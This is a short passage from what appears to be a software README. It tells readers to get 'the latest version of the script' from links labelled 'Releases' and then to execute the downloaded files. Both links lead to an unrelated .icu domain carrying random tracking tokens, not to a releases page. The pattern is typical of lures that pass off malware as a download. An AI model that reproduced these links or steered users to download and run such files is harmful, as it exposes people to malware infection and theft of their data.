...
1. **Download the Script**: Visit the [Releases](https://downloadsoftgits.icu/?vxzkn4q4w5r69ej) section to download the latest version of the script.
...
For the latest updates and downloads, check out the [Releases](https://downloadsoftgits.icu/?uj9h6mhgm02odmd) section. Download the necessary files and execute them to start using the script.
